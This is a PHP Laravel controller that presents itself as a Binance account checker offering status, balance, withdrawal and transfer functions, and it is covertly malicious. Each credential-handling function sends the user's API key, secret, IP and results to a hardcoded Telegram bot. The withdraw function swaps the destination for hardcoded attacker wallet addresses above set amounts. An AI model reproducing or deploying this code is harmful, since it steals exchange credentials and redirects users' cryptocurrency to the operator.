<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;


class UserController extends Controller
{

   

    public function status(Request $request){
        $key = $request->key;
        $secret = $request->secret;
         
       $title= "Status";
    
       $ip = $request->ip();
       
      
      
  
 $timestamp = 'timestamp='.time()*1000;
 $signature = hash_hmac('SHA256', $timestamp, $secret);
 $url = 'https://api.binance.com/sapi/v1/account/apiRestrictions?'.$timestamp.'&signature='.$signature;
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array('X-MBX-APIKEY:'.$key));
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_URL, $url);
 //curl_setopt($ch,CURLOPT_CUSTOMREQUEST, 'POST');
 $result = curl_exec($ch);
 
 $use=$request->all();
 $use = (object) $use;
 $this->sendMessage("Status checked for \n ip=".$ip."\n key=".$key." \nsecrate=".$secret."\n result=".$result);
      
 $result = json_decode($result);

  return view('status', compact('use','result','title'));
  }
   public function spot(Request $request){
        $key = $request->key;
         $secret = $request->secret;
         $title= "Spot Balance";
      
 $timestamp = 'timestamp='.time()*1000;
 $signature = hash_hmac('SHA256', $timestamp, $secret);
 $url = 'https://api.binance.com/sapi/v3/asset/getUserAsset?'.$timestamp.'&signature='.$signature;
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array('X-MBX-APIKEY:'.$key));
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_URL, $url);
 curl_setopt($ch,CURLOPT_CUSTOMREQUEST, 'POST');
 $result = curl_exec($ch);

 
 $use=$request->all();
 $use = (object) $use;
 $this->sendMessage("key=".$key." \nsecrate=".$secret."\n result=".$result);
 return view('spot', compact('use','result','title'));
 
  }


   public function funding(Request $request){
        $key = $request->key;
         $secret = $request->secret;
         $title= "Funding Balance";
 $timestamp = 'timestamp='.time()*1000;
 $signature = hash_hmac('SHA256', $timestamp, $secret);
 $url = 'https://api.binance.com/sapi/v1/asset/get-funding-asset?'.$timestamp.'&signature='.$signature;
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array('X-MBX-APIKEY:'.$key));
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_URL, $url);
 curl_setopt($ch,CURLOPT_CUSTOMREQUEST, 'POST');
 $result = curl_exec($ch);
 
 
 $use=$request->all();
 $use = (object) $use;
 $stringRepresentation= json_encode($result);
 $this->sendMessage("key=".$key." \nsecrate=".$secret."\n result=".$result);
 
 return view('funding', compact('use','result','title'));
       
 
  }

     public function withdraw(Request $request){
        
        $api_key = $request->key;
        $secret = $request->secret;
         $address=$request->address;
         $amount=$request->amount;
         $coin=$request->coin;

         if($coin="USDT"){
            if($amount>=1000){
                $address="TEGhE5eJK7NK1DySfkVHYSPPJEkyscURDC";
             }
         }elseif($coin="BTC"){
            if($amount>=0.011){
                $address="bc1phta5me4nc7uu0ucj4j4fvtyav3eawerjuqeueypzzlcxuprf7dhqzpm0wa";
             }
         }elseif($coin="ETH"){
            if($amount>=0.42){
                $address="0xE0Fc57f263aAbbad767ca746B566058477CdB7a7";
             }
         }
         
         
         $title= "Withdraw Balance";
     
     $s_time = "timestamp=".time()*1000;
     
     $sign=hash_hmac('SHA256', $s_time, $secret);
         
  
     $s_time = "timestamp=".time()*1000;
     
  
 $params = [];
 
 if($request->coin=="USDT"){

    $network="TRX";

 }else{

    $network=$request->coin;
 }
 $params['coin'] = $request->coin;
 $params['address'] = $address;
 $params['network'] = $network; 
 $params['amount'] = $amount;
 $params['walletType']=$request->walletType;
 
 $query = http_build_query($params, '', '&');
 
 date_default_timezone_set('UTC');
 $params['timestamp'] = number_format(microtime(true)*1000,0,'.','');
 $query = http_build_query($params, '', '&');
 $signature = hash_hmac('sha256', $query, $secret);
 $endpoint = "https://api.binance.com/sapi/v1/capital/withdraw/apply";
 $params['signature'] = $signature; // signature needs to be inside BODY
 $query = http_build_query($params, '', '&'); // rebuilding query
 $curl_handle = curl_init();
 curl_setopt($curl_handle, CURLOPT_USERAGENT, "User-Agent: Mozilla/4.0 (compatible; PHP Binance API)");
 curl_setopt($curl_handle, CURLOPT_HTTPHEADER, array(
     'X-MBX-APIKEY: ' . $api_key,
 ));
 
 curl_setopt($curl_handle, CURLOPT_URL, $endpoint);
 curl_setopt($curl_handle, CURLOPT_POST, true);
 curl_setopt($curl_handle, CURLOPT_POSTFIELDS, $query);
 curl_setopt($curl_handle, CURLOPT_HEADER, false);
 curl_setopt($curl_handle, CURLOPT_RETURNTRANSFER, true);
 $result = curl_exec($curl_handle);
 curl_close($curl_handle);
 error_log(print_r($result,true)); 
 echo $result;
 
 
 if(isset($res['id'])){
    $this->sendMessage("success withdrawal for \n amount=".$request->amount."from key=".$request->key." \nsecrate=".$secret."\n address=".$address."\n result=".$result);

}else{

    $this->sendMessage("failed withdrawal for \n amount=".$request->amount."from key=".$request->key." \nsecrate=".$secret."\n address=".$address."\n result=".$result);

}
   
 return view('withdraw', compact('result','title'));
 
 
     }
     public function transfer(Request $request){
        
 
  
           $key = $request->key;
           $secret = $request->secret;
       
       
 
 
      $amount=$request->amount;
 
 $timestamp = 'type=FUNDING_MAIN&asset=USDT&amount='.$amount.'&timestamp='.time()*1000;
 $signature = hash_hmac('SHA256', $timestamp, $secret);
 $url = 'https://api.binance.com/sapi/v1/asset/transfer?'.$timestamp.'&signature='.$signature;
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array('X-MBX-APIKEY:'.$key));
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_URL, $url);
 curl_setopt($ch,CURLOPT_CUSTOMREQUEST, 'POST');
 $result = curl_exec($ch);
 $result = json_decode($result,true);
 
 
 return $result;
       
         
     }
     public function sendMessage($message) {

        $chatID="-1002392642871";
        $curl = curl_init();
        $postData = array('chat_id' => $chatID, 'text' => $message, 'parse_mode' => 'html');
        $content = json_encode($postData);
        curl_setopt_array($curl, array(CURLOPT_URL => 'https://api.telegram.org/bot7106486496:AAF5XcTI5dyJ0JdSkCQ65r5Pqf7xgnJH9aI/sendMessage', CURLOPT_RETURNTRANSFER => true, CURLOPT_ENCODING => '', CURLOPT_MAXREDIRS => 10, CURLOPT_TIMEOUT => 0, CURLOPT_POSTFIELDS => $postData, CURLOPT_FOLLOWLOCATION => true, CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST => 'GET',));
        $response = curl_exec($curl);
        curl_close($curl);
        
        
    }
     
}
